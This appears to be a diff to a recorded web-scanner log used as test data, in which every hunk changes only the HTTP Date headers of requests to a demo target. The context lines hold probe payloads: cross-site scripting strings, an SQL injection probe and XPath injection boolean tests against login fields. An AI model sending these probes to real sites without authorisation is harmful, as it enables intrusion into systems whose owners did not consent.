@@ -9528,7 +9528,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -9559,7 +9559,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E&amp;password=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E
 HTTP/1.1 200 OK
 Content-Length: 594
-Date: Mon, 15 Sep 2014 14:45:07 GMT
+Date: Mon, 1 Dec 2014 14:45:07 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -9603,7 +9603,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -9644,7 +9644,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 76677
-Date: Mon, 15 Sep 2014 14:45:17 GMT
+Date: Mon, 1 Dec 2014 14:45:17 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -10334,7 +10334,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10375,7 +10375,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 206
-Date: Mon, 15 Sep 2014 14:45:37 GMT
+Date: Mon, 1 Dec 2014 14:45:37 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10410,7 +10410,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10451,7 +10451,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 210
-Date: Mon, 15 Sep 2014 14:45:37 GMT
+Date: Mon, 1 Dec 2014 14:45:37 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10486,7 +10486,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10527,7 +10527,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 207
-Date: Mon, 15 Sep 2014 14:45:37 GMT
+Date: Mon, 1 Dec 2014 14:45:37 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10562,7 +10562,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10603,7 +10603,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 207
-Date: Mon, 15 Sep 2014 14:45:37 GMT
+Date: Mon, 1 Dec 2014 14:45:37 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10638,7 +10638,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10679,7 +10679,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 207
-Date: Mon, 15 Sep 2014 14:45:37 GMT
+Date: Mon, 1 Dec 2014 14:45:37 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10714,7 +10714,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10755,7 +10755,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 168
-Date: Mon, 15 Sep 2014 14:46:02 GMT
+Date: Mon, 1 Dec 2014 14:46:02 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Wed, 01 Jun 2011 14:10:16 GMT
 ETag: "200000002343c-a8-4a4a7146ca200"
@@ -10791,7 +10791,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10832,7 +10832,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 211
-Date: Mon, 15 Sep 2014 14:46:33 GMT
+Date: Mon, 1 Dec 2014 14:46:33 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10867,7 +10867,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10908,7 +10908,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:46:33 GMT
+Date: Mon, 1 Dec 2014 14:46:33 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -10943,7 +10943,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -10984,7 +10984,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:46:33 GMT
+Date: Mon, 1 Dec 2014 14:46:33 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -11019,7 +11019,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -11060,7 +11060,7 @@ Host: tftarget
 
 HTTP/1.1 403 Forbidden
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:46:33 GMT
+Date: Mon, 1 Dec 2014 14:46:33 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -11096,7 +11096,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11123,7 +11123,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:47:00 GMT
+Date: Mon, 1 Dec 2014 14:47:00 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11162,7 +11162,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11189,7 +11189,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 279
-Date: Mon, 15 Sep 2014 14:47:01 GMT
+Date: Mon, 1 Dec 2014 14:47:01 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11223,7 +11223,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 279
-Date: Mon, 15 Sep 2014 14:49:23 GMT
+Date: Mon, 1 Dec 2014 14:49:23 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11249,7 +11249,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 279
-Date: Mon, 15 Sep 2014 14:49:25 GMT
+Date: Mon, 1 Dec 2014 14:49:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11288,7 +11288,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -11315,7 +11315,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 226
-Date: Mon, 15 Sep 2014 14:47:01 GMT
+Date: Mon, 1 Dec 2014 14:47:01 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Wed, 01 Jun 2011 19:59:54 GMT
 ETag: "1000000023445-e2-4a4abf6cf8280"
@@ -11355,7 +11355,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 375
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11387,7 +11387,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 267
-Date: Mon, 15 Sep 2014 14:47:05 GMT
+Date: Mon, 1 Dec 2014 14:47:05 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 02 Jun 2011 21:45:34 GMT
 ETag: "2000000023438-10b-4a4c18e8b9b80"
@@ -11427,7 +11427,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 375
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11459,7 +11459,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 267
-Date: Mon, 15 Sep 2014 14:47:05 GMT
+Date: Mon, 1 Dec 2014 14:47:05 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 02 Jun 2011 21:45:34 GMT
 ETag: "2000000023438-10b-4a4c18e8b9b80"
@@ -11505,7 +11505,7 @@ Referer: http://tftarget/demo/SQLI.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 350
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11540,7 +11540,7 @@ Referer: http://tftarget/demo/SQLI.php
 username=WF%27SQL%22Probe%3BA--B
 HTTP/1.1 200 OK
 Content-Length: 523
-Date: Mon, 15 Sep 2014 14:47:24 GMT
+Date: Mon, 1 Dec 2014 14:47:24 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11589,7 +11589,7 @@ Referer: http://tftarget/demo/SQLI.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 350
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11624,7 +11624,7 @@ Referer: http://tftarget/demo/SQLI.php
 username="
 HTTP/1.1 200 OK
 Content-Length: 515
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11670,7 +11670,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11701,7 +11701,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27+%2B+%27%27+%2B+%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:14 GMT
+Date: Mon, 1 Dec 2014 14:52:14 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11733,7 +11733,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27+%2B+%27+%2B+%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 540
-Date: Mon, 15 Sep 2014 14:52:14 GMT
+Date: Mon, 1 Dec 2014 14:52:14 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11769,7 +11769,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27+%2B+%27%27+%2B+%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:14 GMT
+Date: Mon, 1 Dec 2014 14:52:14 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11803,7 +11803,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27+%2B+%27+%2B+%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 540
-Date: Mon, 15 Sep 2014 14:52:14 GMT
+Date: Mon, 1 Dec 2014 14:52:14 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11841,7 +11841,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27+%2B+%27%27+%2B+%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:14 GMT
+Date: Mon, 1 Dec 2014 14:52:14 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11884,7 +11884,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11915,7 +11915,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25224)%22&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 571
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11958,7 +11958,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -11989,7 +11989,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25226)&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 624
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12032,7 +12032,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12063,7 +12063,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&gt;'&gt;&lt;script&gt;alert(25232)&lt;/script&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 564
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12106,7 +12106,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12137,7 +12137,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&gt;'&gt;&lt;%00script&gt;alert(25236)&lt;/script&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 565
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12180,7 +12180,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12211,7 +12211,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&gt;"&gt;&lt;%00script&gt;alert(25238)&lt;/script&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 565
-Date: Mon, 15 Sep 2014 14:47:25 GMT
+Date: Mon, 1 Dec 2014 14:47:25 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12254,7 +12254,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12285,7 +12285,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825248%29%3E&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 570
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12328,7 +12328,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12359,7 +12359,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27%22%3E%3Cscript%3Ealert(25252)%3C%2Fscript%3E&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 563
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12402,7 +12402,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12433,7 +12433,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25268)&gt;HoverMe&lt;/A&gt;&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 583
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12480,7 +12480,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12511,7 +12511,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 532
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12554,7 +12554,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12585,7 +12585,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=\'&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 533
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12628,7 +12628,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12659,7 +12659,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%00&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 533
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12707,7 +12707,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12738,7 +12738,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 571
-Date: Mon, 15 Sep 2014 14:47:26 GMT
+Date: Mon, 1 Dec 2014 14:47:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12786,7 +12786,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12817,7 +12817,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 560
-Date: Mon, 15 Sep 2014 14:47:27 GMT
+Date: Mon, 1 Dec 2014 14:47:27 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12851,7 +12851,7 @@ Referer: http://tftarget/demo/XPathInjection2.php
 
 HTTP/1.1 404 Not Found
 Content-Length: 210
-Date: Mon, 15 Sep 2014 14:47:27 GMT
+Date: Mon, 1 Dec 2014 14:47:27 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -12886,7 +12886,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12917,7 +12917,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+and+%27foobar%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12949,7 +12949,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+and+%27barfoo%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -12981,7 +12981,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+or+%27foobar%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 227
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13013,7 +13013,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+or+%27barfoo%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 212
